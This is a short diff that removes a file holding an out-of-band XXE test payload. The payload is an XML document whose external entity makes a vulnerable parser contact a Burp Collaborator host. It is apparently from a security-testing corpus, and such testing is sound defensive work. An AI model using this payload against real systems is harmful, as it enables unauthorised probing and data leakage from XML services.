@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE test [ 
- <!ELEMENT text ANY> 
-]><!DOCTYPE root [ <!ENTITY xxe SYSTEM "https://N.dhyrvosj62dy3o2henydgnsvdmjdahy6.burpcollaborator.net/x"> ]><text>&xxe;</text>
